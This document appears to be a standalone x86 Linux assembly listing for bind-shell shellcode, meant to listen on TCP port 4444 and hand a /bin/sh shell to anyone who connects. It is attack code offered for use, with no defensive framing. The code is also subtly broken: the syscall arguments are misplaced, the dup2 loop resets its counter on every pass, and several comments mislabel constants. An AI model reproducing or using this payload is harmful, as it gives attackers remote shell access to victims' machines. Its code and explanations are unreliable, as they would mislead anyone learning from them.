section .text
    global _start

_start:
    ; Socket syscall (socket(AF_INET, SOCK_STREAM, IPPROTO_IP))
    xor eax, eax        ; Clear EAX register
    xor ebx, ebx        ; Clear EBX register
    push byte 0x6       ; IPPROTO_IP (IP protocol number)
    push byte 0x1       ; SOCK_STREAM (TCP socket type)
    push byte 0x2       ; AF_INET (IPv4 family)
    mov al, 0x66        ; Socketcall syscall number for socket
    mov bl, 0x1         ; Socketcall syscall for socket function
    int 0x80            ; Call socket syscall

    ; Bind syscall (bind(sockfd, &addr, addrlen))
    mov ebx, eax        ; Store socket file descriptor in EBX
    xor eax, eax        ; Clear EAX register
    push eax            ; Null byte for terminating string
    push word 0x5c11    ; Port 4444 in little-endian format
    push word bx        ; Store socket file descriptor in BX
    push byte 0x2       ; AF_INET (IPv4 family)
    mov ecx, esp        ; ECX points to the address struct
    mov al, 0x66        ; Socketcall syscall number for bind
    mov bl, 0x2         ; Socketcall syscall for bind function
    int 0x80            ; Call bind syscall

    ; Listen syscall (listen(sockfd, backlog))
    mov al, 0x66        ; Socketcall syscall number for listen
    mov bl, 0x4         ; Socketcall syscall for listen function
    int 0x80            ; Call listen syscall

    ; Accept syscall (accept(sockfd, addr, addrlen))
    xor eax, eax        ; Clear EAX register
    mov al, 0x66        ; Socketcall syscall number for accept
    mov bl, 0x5         ; Socketcall syscall for accept function
    push eax            ; Null byte for terminating string
    push eax            ; Null byte for terminating string
    push ebx            ; Original socket file descriptor
    mov ecx, esp        ; ECX points to the address struct
    int 0x80            ; Call accept syscall

    ; Dup2 loop for standard input, output, and error
dup_loop:
    xor ebx, ebx        ; Clear EBX register
    mov al, 0x3f        ; Syscall number for dup2
    inc ebx             ; Increment EBX (file descriptor)
    int 0x80            ; Call dup2 syscall
    cmp ebx, 0x2        ; Compare EBX with 2 (stderr)
    jle dup_loop        ; Jump to dup_loop if less than or equal to 2

    ; Execute /bin/sh
    xor eax, eax        ; Clear EAX register
    push eax            ; Null byte for terminating string
    push 0x68732f2f     ; "hs//" in little-endian format
    push 0x6e69622f     ; "nib/" in little-endian format
    mov ebx, esp        ; Store pointer to "/bin//sh" string in EBX
    mov al, 0xb         ; Syscall number for execve
    int 0x80            ; Call execve syscall
